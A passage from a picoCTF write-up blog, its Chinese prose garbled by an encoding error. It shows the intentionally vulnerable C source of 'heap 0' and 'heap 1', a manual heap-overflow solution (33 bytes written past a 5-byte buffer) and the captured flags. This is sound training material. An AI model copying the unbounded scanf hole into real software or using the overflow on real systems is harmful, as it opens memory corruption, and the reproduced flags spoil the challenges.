        flag <span class="token operator">+=</span> long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœç„¶ï¼ŒåŸ·è¡Œå¾Œå°±å¯ä»¥çœ‹åˆ° Flag å•¦ã€‚</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;4n1m41_57y13_4x4_f14g_e11e8018&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="heap-0">heap 0</h1><p>å…ˆæŠŠé¡Œç›®çµ¦çš„ source code ä¸‹è¼‰ä¸‹ä¾†çœ‹çœ‹ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FLAGSIZE_MAX</span> <span class="token expression"><span class="token number">64</span></span></span>
<span class="token comment">// amount of memory allocated for input_data</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INPUT_DATA_SIZE</span> <span class="token expression"><span class="token number">5</span></span></span>
<span class="token comment">// amount of memory allocated for safe_var</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SAFE_VAR_SIZE</span> <span class="token expression"><span class="token number">5</span></span></span>

<span class="token keyword">int</span> num_allocs<span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>safe_var<span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>input_data<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">check_win</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>safe_var<span class="token punctuation">,</span> <span class="token string">"bico"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYOU WIN\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Print flag</span>
        <span class="token keyword">char</span> buf<span class="token punctuation">[</span>FLAGSIZE_MAX<span class="token punctuation">]</span><span class="token punctuation">;</span>
        FILE <span class="token operator">*</span>fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> FLAGSIZE_MAX<span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Looks like everything is still secure!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNo flage for you :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">print_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n1. Print Heap:\t\t(print the current state of the heap)"</span>
           <span class="token string">"\n2. Write to buffer:\t(write to your own personal block of data "</span>
           <span class="token string">"on the heap)"</span>
           <span class="token string">"\n3. Print safe_var:\t(I'll even let you look at my variable on "</span>
           <span class="token string">"the heap, "</span>
           <span class="token string">"I'm confident it can't be modified)"</span>
           <span class="token string">"\n4. Print Flag:\t\t(Try to print the flag, good luck)"</span>
           <span class="token string">"\n5. Exit\n\nEnter your choice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWelcome to heap0!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>
        <span class="token string">"I put my data on the heap so it should be safe from any tampering.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Since my data isn't on the stack I'll even let you write whatever "</span>
           <span class="token string">"info you want to the heap, I already took care of using malloc for "</span>
           <span class="token string">"you.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    input_data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>INPUT_DATA_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strncpy</span><span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"pico"</span><span class="token punctuation">,</span> INPUT_DATA_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    safe_var <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>SAFE_VAR_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strncpy</span><span class="token punctuation">(</span>safe_var<span class="token punctuation">,</span> <span class="token string">"bico"</span><span class="token punctuation">,</span> SAFE_VAR_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">write_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data for buffer: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> input_data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">print_heap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Heap State:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+-------------+----------------+\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Address   ->   Heap Data   \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+-------------+----------------+\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]   %p  ->   %s\n"</span><span class="token punctuation">,</span> input_data<span class="token punctuation">,</span> input_data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+-------------+----------------+\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]   %p  ->   %s\n"</span><span class="token punctuation">,</span> safe_var<span class="token punctuation">,</span> safe_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+-------------+----------------+\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token comment">// Setup</span>
    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">print_heap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> choice<span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">print_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> rval <span class="token operator">=</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>rval <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>rval <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">//printf("Invalid input. Please enter a valid choice.\n");</span>
            <span class="token comment">//fflush(stdout);</span>
            <span class="token comment">// Clear input buffer</span>
            <span class="token comment">//while (getchar() != '\n');</span>
            <span class="token comment">//continue;</span>
	    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">switch</span> <span class="token punctuation">(</span>choice<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
            <span class="token comment">// print heap</span>
            <span class="token function">print_heap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
            <span class="token function">write_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
            <span class="token comment">// print safe_var</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nTake a look at my variable: safe_var = %s\n\n"</span><span class="token punctuation">,</span>
                   safe_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
            <span class="token comment">// Check for win condition</span>
            <span class="token function">check_win</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
            <span class="token comment">// exit</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token operator">:</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Invalid choice\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç™¼ç¾ä»–å°±æ˜¯è¦æƒ³è¾¦æ³•å»è“‹æ‰ä¸€å€‹å«åš<code>safe_var</code>çš„è®Šæ•¸ï¼Œæ‰€ä»¥æˆ‘å€‘å…ˆé€£æ¥åˆ°é¡Œç›®çœ‹çœ‹å§ã€‚</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5d57314662b0  ->   pico
+-------------+----------------+
[*]   0x5d57314662d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€£æ¥åˆ°é¡Œç›®å¾Œï¼Œæˆ‘å€‘å¯ä»¥çœ‹è¦‹<code>input_data</code>å’Œ<code>safe_var</code>ä¸­é–“éš”äº† 0x20 å€‹ bytesï¼ˆ0x5d57314662d0 - 0x5d57314662b0ï¼‰ï¼Œä¹Ÿå°±æ˜¯åé€²ä½ä¸­çš„ 32ã€‚é€™ä»£è¡¨æˆ‘å€‘è¦å¯«å…¥ 33 å€‹ bytes åˆ°<code>input_data</code>è£¡é¢ï¼Œå› ç‚ºå¾ˆà«å–®ï¼Œå°±ä¹Ÿä¸å¯« Exploit äº†ç›´æ¥æ‰‹å‹•è¼¸å…¥å§ã€‚</p><p>é¦–å…ˆè¼¸å…¥ 2ï¼Œç„¶å¾Œè¼¸å…¥ 33 å€‹å­—å…ƒã€‚ç„¶å¾Œè¼¸å…¥å®Œå¾Œå†è¼¸å…¥ 1 æŠŠ Heap æ‰“å°å‡ºä¾†çœ‹çœ‹ï¼Œå°±å¯ä»¥çœ‹åˆ°åŸæœ¬ bico çš„åœ°æ–¹è¢«è¦†è“‹æ‰äº†ã€‚è¦†è“‹æ‰å¾Œå†é¸ 4 æŠŠ Flag æ‰“å°å‡ºä¾†å°±å¥½å•¦ï¼</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;my_first_heap_overflow_1ad0e1a6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="heap-1">heap 1</h1><p>å…ˆçœ‹é¡Œç›®çµ¦çš„ä»£ç¢¼ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FLAGSIZE_MAX</span> <span class="token expression"><span class="token number">64</span></span></span>
<span class="token comment">// amount of memory allocated for input_data</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INPUT_DATA_SIZE</span> <span class="token expression"><span class="token number">5</span></span></span>
<span class="token comment">// amount of memory allocated for safe_var</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SAFE_VAR_SIZE</span> <span class="token expression"><span class="token number">5</span></span></span>

<span class="token keyword">int</span> num_allocs<span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>safe_var<span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span>input_data<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">check_win</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>safe_var<span class="token punctuation">,</span> <span class="token string">"pico"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYOU WIN\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Print flag</span>
        <span class="token keyword">char</span> buf<span class="token punctuation">[</span>FLAGSIZE_MAX<span class="token punctuation">]</span><span class="token punctuation">;</span>
        FILE <span class="token operator">*</span>fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> FLAGSIZE_MAX<span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Looks like everything is still secure!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNo flage for you :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">print_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n1. Print Heap:\t\t(print the current state of the heap)"</span>
           <span class="token string">"\n2. Write to buffer:\t(write to your own personal block of data "</span>
           <span class="token string">"on the heap)"</span>
           <span class="token string">"\n3. Print safe_var:\t(I'll even let you look at my variable on "</span>
           <span class="token string">"the heap, "</span>
           <span class="token string">"I'm confident it can't be modified)"</span>
           <span class="token string">"\n4. Print Flag:\t\t(Try to print the flag, good luck)"</span>
           <span class="token string">"\n5. Exit\n\nEnter your choice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWelcome to heap1!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>
        <span class="token string">"I put my data on the heap so it should be safe from any tampering.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Since my data isn't on the stack I'll even let you write whatever "</span>
           <span class="token string">"info you want to the heap, I already took care of using malloc for "</span>
           <span class="token string">"you.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    input_data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>INPUT_DATA_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strncpy</span><span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"pico"</span><span class="token punctuation">,</span> INPUT_DATA_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    safe_var <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>SAFE_VAR_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strncpy</span><span class="token punctuation">(</span>safe_var<span class="token punctuation">,</span> <span class="token string">"bico"</span><span class="token punctuation">,</span> SAFE_VAR_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">write_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data for buffer: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> input_data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">print_heap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Heap State:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+-------------+----------------+\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Address   ->   Heap Data   \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+-------------+----------------+\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]   %p  ->   %s\n"</span><span class="token punctuation">,</span> input_data<span class="token punctuation">,</span> input_data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+-------------+----------------+\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]   %p  ->   %s\n"</span><span class="token punctuation">,</span> safe_var<span class="token punctuation">,</span> safe_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"+-------------+----------------+\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token comment">// Setup</span>
    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">print_heap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> choice<span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">print_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">switch</span> <span class="token punctuation">(</span>choice<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
            <span class="token comment">// print heap</span>
            <span class="token function">print_heap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
            <span class="token function">write_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
            <span class="token comment">// print safe_var</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nTake a look at my variable: safe_var = %s\n\n"</span><span class="token punctuation">,</span>
                   safe_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
            <span class="token comment">// Check for win condition</span>
            <span class="token function">check_win</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
            <span class="token comment">// exit</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token operator">:</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Invalid choice\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
